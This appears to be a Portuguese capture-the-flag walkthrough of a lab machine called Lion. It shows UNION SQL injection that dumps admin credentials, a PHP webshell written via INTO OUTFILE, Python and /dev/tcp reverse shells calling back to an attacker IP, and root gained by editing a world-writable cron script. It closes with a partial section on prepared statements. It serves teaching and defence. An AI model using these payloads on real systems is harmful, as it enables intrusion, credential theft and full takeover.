Hora de testar.

**Teste inicial:**

Digitamos uma aspa simples (`'`) no campo de busca e clicamos em pesquisar.

**Interessante**: Não deu erro, foi como uma busca errada normal. 

Porém, se fizermos uma busca inválida qualquer, já conseguimos ver **uma mensagem diferente** e bem importante para a gente. 

<img width="25%" alt="image" src="https://github.com/user-attachments/assets/ae824e5d-210c-4463-b7f4-e673a5e7b792" />

Então, qualquer pesquisa que resulte em erro de query já revelaria a **primeira flag** mesmo:

> **Flag 1:** `uhc{1nv4l1d_s3arch_qu3ry}`

Mas vamos além, precisamos confirmar o SQL Injection para explorá-lo.

**Descobrindo SQLi de forma básica:**

A melhor e mais prática forma de testar, nesse caso, seria abusarmos da lógica matemática para uma condicional simples e irrefutável.

Uma lógica matemática que sempre será verdadeira, como 1=1, pode ser utilizado para alterarmos a query e termos o resultado que queremos. Para isso precisaríamos começar com aspas para fechar o `'%` e não podemos esquecer de comentar o resto da query, se não ficará invalido novamente e veremos a tela de 'not found' com a primeira flag.

Então, se digitarmos `' OR 1=1#`, a query ficaria mais ou menos assim:

<img width="15%" alt="image" src="https://github.com/user-attachments/assets/4dad3a65-5138-49bb-a726-0b0206e2bf78" />

```sql
SELECT * FROM news WHERE title LIKE '%' OR 1=1#%';
# ou  SELECT title FROM news WHERE title LIKE '%' OR 1=1#%';
```
> Estou supondo que a tabela aonde tem as notícias se chama `news`

Nesse caso, o `WHERE` vai acabar sempre sendo positivo. 

A mensagem ficou algo como "**Me mostre todas as noticias se o título é algo/vazio ou se 1 for igual a 1**", e como 1 sempre será igual a 1, então ele vai mostrar as notícias todas. 

**Resultado:**

<img width="50%" alt="image" src="https://github.com/user-attachments/assets/0d7041be-ca1f-4cd9-ada4-f61a6f6a2289" />

Printou realmente todas as notícias! SQLi confirmado!!

**Descobrindo o número de colunas com ORDER BY:**

Primeiro, vamos usar o método ORDER BY pra ter uma noção de quantas colunas a query original tem. Começamos com números altos pra ser mais rápido:

```sql
' order by 10#     -- Erro! (muitas colunas)
' order by 5#      -- Funciona
' order by 9#      -- Erro!
' order by 6#      -- Funciona
' order by 8#      -- Erro!
' order by 7#      -- Funciona

-- Parou de funcionar do 8 em diante -> temos 7 colunas

```

Descobri que a query tem **7 colunas**. Agora preciso confirmar com UNION SELECT e descobrir quais dessas colunas são visíveis na página.

**Confirmando com UNION SELECT e descobrindo colunas visíveis:**

```sql
' union select 1,2,3,4,5,6#       -- Erro (faltou 1 coluna)
' union select 1,2,3,4,5,6,7#     -- Funciona!
```

A query de pesquisa acabou ficando mais ou menos assim:

```sql
SELECT * FROM news WHERE title LIKE '%' union select 1,2,3,4,5,6,7#%';
```

Quando a página carrega, olharemos onde os números aparecem. 

O número **2** aparece claramente no lugar onde antes tinha o título da notícia da aba de busca. Isso significa que a **coluna title** (única visível) está com conteúdo `2` (que adicionamos por ser a segunda coluna).

Perceba que é nessa **posição 2** que vou injetar minhas queries com objetivo de extrair dados, visto que os outros números (1, 3, 4, 5, 6, 7) são só preenchimento pra manter as 7 colunas necessárias para o `union` funcionar (visto que não dá para unir duas tabelas com colunas diferentes/incompatíveis).

**Reconhecimento do ambiente:**

Primeiro, descubro o nome do banco:

```sql
' union select 1,database(),3,4,5,6,7#
```

Descobrimos que na verdade é o próprio banco de dados que se chama `news` (quem diria kk).

Podemos usar outros comandos como `user()` ou `@@version` e por aí vai.

<img width="45%" alt="image" src="https://github.com/user-attachments/assets/cb186761-1387-492b-aba1-8998a8c905cf" />

**Enumerando as tabelas:**

```sql
' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema = 'news'#
```

De novo, `table_name` está na posição 2 porque é a visível. Essa query vai no `information_schema.tables` (a tabela que lista todas as tabelas) e filtra pelo banco `news`.

O resultado mostra as tabelas do banco:
- `tbladmin`
- `tblcategory`
- `tblcomments`
- `tblpages`
- `tblposts`
- `tblsubcategory`

A tabela mais interessante pra gente é obviamente `tbladmin` - a tabela de administradores.

**Descobrindo as colunas da tbladmin:**

```sql
' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'tbladmin'#
```

Colunas encontradas:
- `id`
- `AdminUserName`
- `AdminPassword`
- `AdminEmailid`
- `Is_Active`
- `CreationDate`
- `UpdationDate`

Para nós, as mais importantes são `AdminUserName` e `AdminPassword`.

**Extraindo as credenciais:**

Aqui vamos usar a função `concat()` que permite juntar duas ou mais expressões em uma única saída:

```sql
' union select 1,concat(AdminUserName,'::',AdminPassword),3,4,5,6,7 from tbladmin#
```

O resultado aparece na tela: `admin::$2y$10$Hfz...` (uma hash longa começando com `$2y$`)

### Fase 3: O Dilema do Hash Bcrypt

Aqui encontramos nosso primeiro muro de concreto. A hash da senha está criptografada com **Bcrypt** (identificamos pelo prefixo `$2y$`). 

O Bcrypt oferece uma segurança muito maior que outros algoritmos criptográficos porque contém uma variável que é proporcional à quantidade de processamento necessário para criptografar a informação desejada. Isso significa que ele é projetado para ser matematicamente **lento** - resistente a ataques de força bruta.

Cada tentativa de quebra demora milissegundos a mais, o que não parece muito, mas quando você precisa testar milhões de senhas, isso vira dias ou semanas de processamento. Não vale a pena tentar quebrar.

Mas não tem problema! Como temos Injeção de SQL com privilégios de escrita, podemos tentar outra abordagem: escrever uma webshell PHP em algum diretório que temos permissão de escrita.

### Fase 4: Pivoteando para RCE via INTO OUTFILE

Lembram do diretório `/includes` que achamos na fase 1? Vamos usá-lo agora. A ideia é: já que temos controle sobre queries SQL, vamos tentar escrever um arquivo PHP malicioso usando o comando `INTO OUTFILE`.

Primeiro, vamos verificar se temos acesso ao diretório `/includes`. Acessando `http://172.16.0.48/includes/` no navegador, conseguimos ver o conteúdo (ou pelo menos não recebemos um erro 403). Isso é um bom sinal de que podemos escrever lá.

**Nosso payload será uma webshell simples:**

```php
<?php system($_GET['cmd']); ?>
```

Esse código PHP pega o parâmetro `cmd` da URL e executa como comando do sistema operacional.

<img width="20%" alt="image" src="https://github.com/user-attachments/assets/b2005116-f0f5-41a7-ba9d-b315ab7f1403" />

**Preparamos o payload no campo de busca:**

<img width="20%" alt="image" src="https://github.com/user-attachments/assets/140d72c9-aa08-431e-9f2a-957d60db8cc6" />

```sql
' union select 1,"<?php system($_GET['cmd']); ?>",3,4,5,6,7 into outfile "/var/www/html/includes/teteu.php"#
```

Algumas observações:
- Usamos aspas duplas no PHP porque a query SQL já usa aspas simples
- O caminho `/var/www/html/` é o padrão do Apache no Linux
- Escolhemos a pasta `/includes/` porque verificamos que temos acesso a ela

Se a query for executada - mesmo se der o erro not found -, nosso arquivo provavelmente foi criado!

**Testando se funcionou:**

Entrando em `includes` novamente, agora vemos o `teteu.php` que criamos.

<img width="20%" alt="image" src="https://github.com/user-attachments/assets/73147596-a47a-45a6-a6f0-f50f0790b709" />

Acessamos: `http://172.16.0.48/includes/teteu.php?cmd=id`

Resposta na tela (no lugar onde apareceria o número 2): `uid=48(apache) gid=48(apache) groups=48(apache)`

**SUCESSO TOTAL!** O servidor executou nosso comando. Temos RCE (Remote Code Execution). A partir daqui, "o sistema é nosso" - pelo menos com as permissões do usuário apache.

**Explorando um pouco:**

```
http://172.16.0.48/includes/teteu.php?cmd=whoami     # apache
http://172.16.0.48/includes/teteu.php?cmd=pwd        # /var/www/html/includes
http://172.16.0.48/includes/teteu.php?cmd=cat /etc/passwd
http://172.16.0.48/includes/teteu.php?cmd=ls -la /home 
http://172.16.0.48/includes/teteu.php?cmd=ls -la / # acharemos a flag, podemos até já pegar ela por aqui com cat /flag.txt
```

Vemos que existe um usuário chamado `lion` além do root. Provavelmente a flag de usuário está no home dele.

### Fase 5: Obtendo um Terminal Real (Reverse Shell)

Ter uma webshell no navegador é útil, mas extremamente limitado. Não conseguimos rodar comandos interativos, usar editores de texto, navegar com tab completion, ou fazer coisas que exigem um terminal real. Precisamos de uma **Reverse Shell**.

A ideia é: fazer o servidor se conectar DE VOLTA pra nossa máquina, nos dando um terminal interativo. É "reverso" porque normalmente nós conectamos no servidor, mas aqui o servidor conecta em nós.

Site ótimo para botar em prática diversos tipos de reverse shell: revshells.com

**Na nossa máquina atacante (10.0.30.175), abrimos um "ouvinte":**

```bash
nc -lvnp 4444
```

Explicando os parâmetros:
- `-l` = Listen mode (modo de escuta - fica esperando conexões)
- `-v` = Verbose (mostra detalhes da conexão)
- `-n` = Não resolver DNS (mais rápido)
- `-p 4444` = Porta onde vamos escutar

**Verificando se o alvo tem Python:**

Na webshell, testamos:
```
http://172.16.0.48/includes/teteu.php?cmd=which python
```

Se retornar algo como `/usr/bin/python`, temos Python disponível. Pode tentar também pelo comando `whereis python`. Em situações sem python, geralmente podemos fazer com script ou algo disponível.

**Enviando a reverse shell:**

Vamos usar Python pra criar a conexão reversa. O payload clássico (revshells.com pode ser útil para copiar payloads prontas):

```
http://172.16.0.48/includes/teteu.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.30.175",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```
> Existem situações (como terá em outra máquina mais difícil) que este tipo de payload não vai funcionar sem URL-Encode. Dessa vez podemos só passar mesmo que funciona.

Explicando o payload Python:
1. `socket.socket()` - Cria um socket de rede
2. `s.connect(("10.0.30.175",4444))` - Conecta no nosso IP e porta que está escutando (netcat)
3. `os.dup2(s.fileno(),0)` - Redireciona stdin pro socket
4. `os.dup2(s.fileno(),1)` - Redireciona stdout pro socket
5. `os.dup2(s.fileno(),2)` - Redireciona stderr pro socket
6. `pty.spawn("sh")` - Spawna um shell

O navegador fica carregando (travado), mas no nosso terminal onde o Netcat estava ouvindo:

```sh
~$ nc -lvnp 4444
listening on [any] 4444...
connect to [10.0.30.175] from (UNKNOWN) [172.16.0.48] 40412
sh-4.2$
```

Estamos dentro da máquina com um shell!


### Fase 6: Upgrade para Shell Interativa (TTY)

Quando a gente ganha um shell "cru", ele costuma funcionar para comandos simples, mas falha em programas interativos. Por exemplo: `su`, `sudo`, `vim`, `nano`, `top`, uso de setas, Tab, Ctrl+C/Ctrl+Z etc.  
Isso acontece porque a sessão não está ligada a um **terminal** (TTY/PTY). Em vez de um terminal de verdade controlando entrada/saída, você só tem um **fluxo de dados** (stdin/stdout), como um pipe.

Pensa assim: conversar por **SMS** é só texto indo e voltando. Já conversar por um app "completo", como WhatsApp, é mais interativo e tem recursos extras: como microfone, ligação em vídeo, etc.  
No Linux, um **TTY/terminal** é esse "modo completo" de conversa com o sistema: não é só texto, existe um conjunto de regras e recursos de interação.

> **TTY/terminal** no Linux: além de texto, ele fornece edição de linha, teclas especiais, sinais e modos de operação. Em outras palavras, é como usar um terminal de verdade com todas as regras e recursos de interação.

#### Sem TTY vs Com TTY

Em uma situação **"Sem TTY"** (Sem terminal), estamos falando só de entrada/saída. Funciona para `ls`, `cat`, `id`, mas falha quando o usuário precisa de interatividade (como usar as setas) ou quando o programa precisa controlar o terminal.

Já **"Com TTY"** (Com terminal), o programa ganha interatividade completa, com:
- leitura de senha **sem eco** (não mostrar o que digita)
- teclas especiais (setas, Tab, Ctrl+L etc.)
- **sinais e job control** (Ctrl+C interrompe, Ctrl+Z suspende, foreground/background)
- noção de tamanho do terminal (linhas/colunas) e capacidades via `TERM`

> TTY representa um terminal interativo mais "real", enquanto que PTY representa um terminal virtual realmente emulado.

#### TTY vs PTY: entendendo de uma vez por todas

Aqui vem a parte que confunde todo mundo, mas vou explicar de um jeito que você não esquece mais.

No Linux existem **dois tipos de terminal**: **TTY** e **PTY**. Os dois fazem a mesma coisa (fornecem terminal interativo pro programa), mas vêm de lugares diferentes.

**TTY (TeleTYpewriter/Teletype)** é um terminal **ligado diretamente ao sistema**. Pensa naqueles terminais que você acessa com Ctrl+Alt+F1, F2, etc. — são os consoles do Linux (tipo `/dev/tty1`, `/dev/tty2`). Eles existem "de verdade" no sistema, gerenciados direto pelo kernel, sem precisar de programa intermediário. É o terminal mais "raiz" que existe.

**PTY (Pseudo-Terminal)** é um terminal **criado por software**. Ele não existe fisicamente — é fabricado por um programa. Funciona assim: existe um **par de dispositivos** (master e slave). O **master** é controlado por algum programa (tipo SSH, tmux, ou aquele terminal gráfico que você abre no Ubuntu), e o **slave** (ex.: `/dev/pts/3`) é o que o programa "lá dentro" enxerga como seu terminal. 

**Analogia**: TTY é como um telefone fixo ligado direto na central telefônica. PTY é ligação pelo WhatsApp. Funciona igual pra você, mas por trás tem um programa simulando a ligação.

**Exemplo prático**: quando você abre o terminal gráfico no Linux (gnome-terminal, xterm, etc.), ele **não te dá um TTY direto**. O que acontece é: o programa cria um **PTY** — ele controla o lado master, e o bash que roda dentro enxerga o slave (`/dev/pts/3`) como seu terminal. Do ponto de vista do bash, ele **tem um terminal completo** (pode usar setas, Ctrl+C, etc.), mas esse terminal foi **fabricado via software** pelo PTY.

**Resumindo de forma certeira**:
- **TTY** = terminal "direto" do sistema (console físico/kernel, como `/dev/tty1`)
- **PTY** = terminal "virtual" criado por software (par master/slave, como `/dev/pts/3`)
- Ambos fornecem **a mesma interface de terminal** pro programa — a diferença é **de onde vem** o terminal

> **Em poucas palavras**: TTY é terminal direto do sistema. PTY é terminal criado por software. Ambos funcionam igual pro programa que está usando

**Spawning um PTY (Pseudo-TTY) com Python:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

O módulo `pty` do Python cria um pseudo-terminal, o que já melhora bastante a situação.

**Upgrade completo para shell totalmente interativa:**

Mas ainda não é perfeito - não temos autocomplete, não podemos usar Ctrl+C sem matar a conexão, etc. Para resolver:

```bash
# Primeiro, coloca o processo em background
# Pressione: Ctrl+Z

# Isso volta pra sua máquina local. Agora digite:
stty raw -echo; fg

# Pressione Enter duas vezes
# Você voltou pro shell remoto

# Agora configure as variáveis de ambiente:
export TERM=xterm
export SHELL=/bin/bash  # Opcional: define bash como shell padrão para subprocessos
```

**Entendendo o comando `stty`:**

O `stty` (podemos pensar como `Set TTY`) é um comando que configura as opções do seu terminal. Ele controla como o terminal processa os caracteres que você digita. Vamos entender cada parte:

- **`stty`** = Como já falamos acima, o comando em si serve para configurar características do terminal
- **`raw`** = Modo "cru" - desabilita todo o processamento de input do terminal local. Normalmente, quando você digita Ctrl+C, seu terminal local intercepta e envia um sinal de interrupção. No modo raw, TUDO que você digita é passado direto para o programa (no caso, a conexão remota). Isso permite que Ctrl+C, Tab, setas funcionem no shell remoto em vez de serem capturados localmente.
- **`-echo`** = Desabilita o "eco" local. Quando você digita algo, normalmente seu terminal mostra o que você digitou (eco). Com `-echo`, ele não mostra - isso evita que você veja os caracteres duplicados (uma vez pelo terminal local, outra vez pelo remoto).
- **`;`** = Separador de comandos - executa o próximo comando em sequência
- **`fg`** = Foreground - traz de volta o processo que estava em background (nossa reverse shell que pausamos com Ctrl+Z)

**Por que funciona?**

Quando você combina `stty raw -echo` com `fg`, você está basicamente dizendo: "Terminal local, para de processar meus inputs, apenas repasse tudo para a conexão remota". O resultado é que sua reverse shell se comporta como se você estivesse sentado fisicamente no servidor.

**Sobre as variáveis de ambiente:**

- **`export TERM=xterm`** = Define o tipo de terminal como xterm. Isso é necessário porque alguns programas (como `clear`, `nano`, `vim`) precisam saber qual terminal você está usando para enviar os códigos de escape corretos (cores, posicionamento do cursor, etc.).
- **`export SHELL=/bin/bash`** = Define o bash como shell padrão. Isso é **opcional** e serve principalmente para que subprocessos e scripts saibam qual shell usar. Se você não definir, alguns programas podem assumir `/bin/sh` (que é mais limitado). Na prática, a maioria das operações funciona sem isso.

Pronto! Agora temos um shell totalmente interativo com autocomplete (tab), histórico (setas), e podemos usar `clear`, `nano`, `vim`, `su`, etc.

Com isso podemos brincar no terminal a vontade e sem medo de ser feliz.

Se tentarmos listar os arquivos de dentro da raiz do sistema:

```bash
ls -la /
```

Encontramos um arquivo com a segunda flag!!

Podemos usar o `cat /flag.txt` para vermos o resultado e já partir para elevação de privilégio em busca da próxima flag.

<img width="25%" alt="image" src="https://github.com/user-attachments/assets/472545cd-2286-4e0b-a0ff-c594dff55a68" />

> **Flag 2:** `uhc{Sql_1nj3ct10n_34sy}`

### Fase 7: Escalação de Privilégio - Entendendo Cronjobs

Neste momento somos o usuário `apache`, um usuário de baixo privilégio. Nosso objetivo final é ser `root` e ler a flag em `/root/`.

**O que são Cronjobs?**

Cron é o agendador de tarefas do Linux. Ele permite executar comandos ou scripts automaticamente em horários específicos. Por exemplo:
- Fazer backup todo dia às 3h da manhã ou a cada minuto
- Limpar arquivos temporários toda hora
- Enviar relatórios toda segunda-feira

A configuração fica em `/etc/crontab` ou em arquivos dentro de `/etc/cron.d/`. O formato é:

```
# minuto hora dia mês dia_semana usuário comando
*       *    *   *   *          root   /script.sh
```

O asterisco (`*`) significa "qualquer valor". Então `* * * * *` significa "todo minuto de toda hora de todo dia...".

**Por que isso é um vetor de ataque?**

Se um cronjob executa um script como root, e nós conseguimos modificar esse script, quando o cron executar, nosso código malicioso será executado com privilégios de root!

### Fase 8: Escalação de Privilégio - A Caçada Manual

Antes de usar ferramentas automatizadas, é fundamental saber procurar vulnerabilidades manualmente. Nem sempre você conseguirá fazer upload de scripts grandes na máquina vítima, e um pentester de verdade precisa saber encontrar falhas com comandos nativos do sistema.

#### Checklist Escalação Manual:

1. **Procurar binários SUID (Set User ID)**

Geralmente é uma boa opção, este comando será bem utilizado em outras máquinas também.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binários com bit SUID executam com as permissões do **dono** do arquivo, não do usuário que executou. Se `/usr/bin/algo` é SUID e pertence ao root, ele roda como root mesmo quando você executa. Binários SUID "estranhos" (não-padrão) são goldmines para privesc. Sites como [GTFOBins](https://gtfobins.github.io/) listam como explorar vários deles.

O `find /` indica que o comando find vai buscar a partir do diretório raiz, percorrendo todo o sistema de arquivos.

O `-perm -4000` filtra os resultados para incluir APENAS arquivos com o bit SUID habilitado. O valor 4000 é permissão SUID, quando esse bit está ativo o programa roda com o UID efetivo do dono do arquivo (root, por exemplo), indepentemente de quem o executa.

Já o `-type f` restringe para buscar arquivos (files) regulares, e não diretórios ou links.

O redirecionamento com `2>/dev/null` é basicamente para **não printar os erros**. `2` é o descritor de arquivo do `stder` (saída de erro padrão), e o operador `>` é o de redirecionamento, que nesse caso vai para `/dev/null/`, que é um dispositivo especial que descarta tudo o que recebe.

Aqui já temos um resultado lindo e podemos progredir.

#### Continuando checklist para fins de curiosidade e aprendizado

```bash
# 2. Verificar sudo mal configurado
sudo -l
```

Não será utilizado neste caso, visto que entramos como usuário apache, mas não apenas não sabemos a senha dele, como nem sabemos se faz parte de sudoers. 

De qualquer forma, o comando lista quais comandos o usuário atual pode executar como root (ou outro usuário). 

Se aparecer algo como `(ALL) NOPASSWD: /usr/bin/vim`, significa que você pode rodar vim como root sem senha - e do vim você consegue spawnar um shell root com `:!bash`. Isso é algo que pode ser útil em outras ocasiões, mas não para essa máquina.

```bash
# 3. Procurar binários SGID (Set Group ID)
find / -perm -2000 -type f 2>/dev/null
```

Similar ao SUID, mas para grupos. Menos comum de explorar, mas vale verificar.

```bash
# 4. Verificar crontabs (tarefas agendadas)
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
crontab -l
```

Cronjobs que executam scripts como root são vetores clássicos. Se conseguirmos modificar o script que o root executa, ganhamos root.

```bash
# 5. Procurar arquivos com permissões fracas (graváveis por qualquer um)
find / -writable -type f 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev"
```

Este comando encontra arquivos que QUALQUER usuário pode modificar. Filtramos `/proc`, `/sys` e `/dev` porque são sistemas de arquivos virtuais que não nos interessam. Se encontrar um script executado por root que você pode editar, jackpot!

```bash
# 6. Procurar arquivos de configuração com senhas
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat /var/www/html/*.php 2>/dev/null | grep -i -E "pass|pwd|senha"
```

Desenvolvedores frequentemente deixam senhas hardcoded em arquivos de configuração. Essas senhas às vezes são reutilizadas para outros serviços ou até para o usuário root.

```bash
# 7. Verificar capabilities
getcap -r / 2>/dev/null
```

Capabilities são permissões granulares que podem ser atribuídas a binários. Por exemplo, `cap_setuid` permite que um programa mude o UID - se um binário tiver isso e você conseguir explorar, pode virar root.

```bash
# 8. Verificar versão do kernel para exploits conhecidos
uname -a
cat /etc/os-release
```

Kernels antigos podem ter vulnerabilidades de escalação como DirtyCow, DirtyPipe, etc. Com a versão em mãos, pesquise por exploits no Google ou Exploit-DB.

```bash
# 9. Procurar scripts de backup (frequentemente mal configurados)
find / -type f -iname "*backup*" 2>/dev/null
find / -type f -iname "*.sh" 2>/dev/null
```

Scripts de backup são notórios por terem permissões 777 porque "precisam funcionar". Se um script de backup roda como root e você pode editá-lo...

```bash
# 10. Verificar processos rodando como root
ps aux | grep root
```

Às vezes há processos rodando como root que você pode manipular ou que têm vulnerabilidades conhecidas.

#### No caso da Lion:

Os comandos que encontram a vulnerabilidade diretamente é:

```bash
find / -perm -4000 -type f 2>/dev/null
#/usr/bin/crontab avistado
#buscar config
find / -iname "crontab" 2>/dev/null
#/etc/crontab
cat /etc/crontab
#podendo tbm achar o script de backup com
#find / -type f -iname "*backup*.sh" 2>/dev/null
```

Ele retorna: `/opt/lion/lion.backup.sh` - um script de backup que será nossa porta de entrada.

```
bash-4.2$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/crontab
/usr/bin/mount
/usr/bin/umount
/usr/bin/at
/usr/bin/atq
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/libexec/dbus-daemon-launch-helper
/usr/libexec/pt_chown

bash-4.2$ find / -iname "crontab" 2>/dev/null
/etc/crontab
/usr/bin/crontab

bash-4.2$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

* * * * * root /opt/lion/lion.backup.sh

bash-4.2$ find / -type f -iname "*backup*.sh" 2>/dev/null
/opt/lion/lion.backup.sh

bash-4.2$ ls -la /opt/lion/lion.backup.sh

-rwxrwxrwx 1 root root ... lion.backup.sh
```

 >/opt/lion/lion.backup.sh é um cron com permissão 777

Teremos nosso nossa nova shell reversa pelo script executar sempre como root, enquanto pode ser editado por um usuário comum:

**Analisando as permissões:**
- Primeiro caractere: `-` = arquivo regular
- `rwx` (posições 2-4): dono (root) pode ler, escrever, executar
- `rwx` (posições 5-7): grupo pode ler, escrever, executar
- `rwx` (posições 8-10): **OUTROS** podem ler, escrever, executar!

### Fase 9: Usando linPEAS para Confirmar (Automatizado)

>A fase 8 e 9 podem ser escolhidas a serem feitas isoladamente,isto é, se você fez a fase 8, pode apenas passar para a fase 10. Para outras máquinas, você pode preferir fazer apenas a fase 9, e por aí vai.

Se preferir automatizar (ou confirmar suas descobertas manuais), o **linPEAS** (Linux Privilege Escalation Awesome Script) é uma ferramenta que verifica centenas de possíveis falhas de configuração.

**Na nossa máquina atacante:**

```bash
# Baixar o script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Servir via HTTP simples
python3 -m http.server 80
```

**Entendendo o servidor HTTP do Python:**

O comando `python3 -m http.server 80` é uma mão na roda para pentesters. Vamos destrinchar:

- **`python3`** = Interpretador Python versão 3
- **`-m`** = Flag que diz "execute este módulo como script"
- **`http.server`** = Módulo built-in do Python que cria um servidor HTTP simples
- **`80`** = Porta onde o servidor vai escutar (padrão HTTP)

O que esse comando faz é transformar o **diretório atual** da sua máquina em um servidor web. Qualquer arquivo que estiver nessa pasta fica acessível via HTTP. Então se você tem `linpeas.sh` no diretório e seu IP é `10.0.30.175`, o arquivo fica disponível em `http://10.0.30.175/linpeas.sh`.

**Por que usamos isso?**

A máquina comprometida geralmente não tem acesso à internet (está isolada na rede do lab), mas tem acesso à nossa máquina via VPN. Criando um servidor HTTP local, podemos transferir arquivos facilmente usando `wget` ou `curl` da máquina vítima.

**Alternativas:**
- `python -m SimpleHTTPServer 80` (Python 2)
- `php -S 0.0.0.0:80` (se tiver PHP instalado)
- `ruby -run -e httpd . -p 80` (se tiver Ruby)

**Na máquina comprometida (como apache):**

```bash
cd /tmp
wget http://10.0.30.175/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

O linPEAS vai fazer uma varredura completa e destacar em vermelho/amarelo as vulnerabilidades encontradas. No caso da Lion, ele aponta claramente:

```
╔══════════╣ Interesting writable files owned by me or writable by everyone
/opt/lion/lion.backup.sh
```

E mais importante, mostra que esse arquivo é executado por root via cron!

**Verificação manual (se preferir não usar linPEAS):**

```bash
# Procurar por scripts de backup
find / -type f -iname "*backup*.sh" 2>/dev/null

# Verificar permissões
ls -la /opt/lion/lion.backup.sh
```

Saída: `-rwxrwxrwx 1 root root ... lion.backup.sh`

Vemos que o **Dono é o root e pode fazer tudo, o grupo pode fazer tudo, mas até os outros também podem fazer tudo**.

Isso é uma falha de configuração grave. O administrador criou um script de backup que roda automaticamente como root (via cron), mas deu permissão 777 - qualquer usuário pode modificar e injetar payload malicioso!

### Fase 10: O Xeque-Mate (Obtendo Root)

A falha está clara. Se editarmos esse script, o root vai executar o nosso código na próxima vez que o cron rodar (a cada 1 minuto).

**Preparando o ouvinte na nossa máquina:**

```bash
nc -lvnp 1337
```

Usamos uma porta diferente (1337) pra não conflitar com a conexão anterior (que ainda está ativa na 4444).

**Modificando o script de backup:**

Podemos usar `nano`, o `vim` e até o `echo`:

Se usar nano (mais fácil):
```bash
nano /opt/lion/lion.backup.sh
# Adicione a linha do reverse shell - eu botei na segunda linha
# Ctrl+S para salvar, Ctrl+X para sair
```

```bash
echo '#!/bin/bash \
/bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' > /opt/lion/lion.backup.sh
```

Ou se quiser manter o conteúdo original e só adicionar nossa linha, use o operador dua vezes `>>`:

```bash
echo '/bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' >> /opt/lion/lion.backup.sh
```

**Aguardando...**

Agora é só esperar. O cron está configurado para executar o script a cada 1 minuto. Fica de olho no terminal onde o Netcat está rodando na porta 1337.

```
Connection received on 172.16.0.48 xxxxx
sh-4.2# whoami
root
```

**SOMOS ROOT!**

### Fase 11: Capturando a Flag Final

```bash
cd /root
ls -la
cat root.txt
```

> **Flag 3 (Root):** `uhc{34sy_cr0nt4b_4tt4ck}`

Completamos a máquina! 🎉

**Resumo do que fizemos:**
1. **Enumeração** - Nmap (portas/serviços) + ffuf (diretórios)
2. **Flag 1** - Erro de busca: `uhc{1nv4l1d_s3arch_qu3ry}`
3. **SQLi com UNION** - Descobrimos 7 colunas com ORDER BY e UNION SELECT
4. **Enumeração do banco** - Extraímos nome do banco, tabelas, colunas e hash Bcrypt
5. **RCE via INTO OUTFILE** - Criamos webshell em `/includes/teteu.php`
6. **Reverse Shell** - Python payload para conexão reversa
7. **TTY Upgrade** - Shell interativa com `stty raw -echo`
8. **Flag 2** - SQL Injection funcionando: `uhc{Sql_1nj3ct10n_34sy}`
9. **Escalação Manual** - Checklist completo de privesc (SUID, crontabs, arquivos graváveis, etc.)
10. **linPEAS** - Confirmação automatizada do vetor de ataque
11. **Root via Cronjob** - Modificamos script de backup, ganhamos root
12. **Flag 3** - Root: `uhc{34sy_cr0nt4b_4tt4ck}`

---

## Parte 7: Prevenção e Mitigação

Não faz sentido falar de ataque sem falar de defesa. Se você é desenvolvedor (ou quer ser), precisa saber como evitar esses problemas. E se você é da área de segurança, precisa saber recomendar as correções certas.

### O Problema: Concatenação de Strings

Todo SQL Injection nasce do mesmo erro: construir queries SQL concatenando strings com input do usuário:

```php
//  ERRADO - NUNCA FAÇA ISSO
$query = "SELECT * FROM usuarios WHERE id = " . $_GET['id'];

//  TAMBÉM ERRADO
$query = "SELECT * FROM usuarios WHERE nome = '" . $_POST['nome'] . "'";
```

### A Solução: Prepared Statements (Consultas Parametrizadas)

A forma correta é usar **Prepared Statements** (ou Parameterized Queries). A ideia é separar a estrutura da query dos dados. O banco de dados sabe exatamente o que é comando SQL e o que é dado do usuário.

**Como funciona na prática:**

Em vez de montar a query como uma string e "colar" o input do usuário, você define a estrutura da query primeiro (com placeholders tipo `?` ou `:nome`) e depois passa os dados separadamente. O banco processa em duas etapas: primeiro entende a estrutura, depois encaixa os dados como valores puros, nunca como código.

**PHP com PDO:**
```php
//  CORRETO - Usando placeholder nomeado (:id)
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE id = :id");
// prepare() envia a estrutura da query pro banco
// O banco já sabe que :id é um VALOR, não um comando

$stmt->execute(['id' => $_GET['id']]);
// execute() envia o valor real. Mesmo que seja "1 OR 1=1",
// o banco trata como string literal, não como código SQL

$resultado = $stmt->fetch();

//  TAMBÉM CORRETO - Usando placeholder posicional (?)
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE nome = ?");
// O ? é substituído pelo valor na ordem do array
$stmt->execute([$_POST['nome']]);
```

**PHP com MySQLi:**
```php
//  CORRETO
$stmt = $mysqli->prepare("SELECT * FROM usuarios WHERE id = ?");
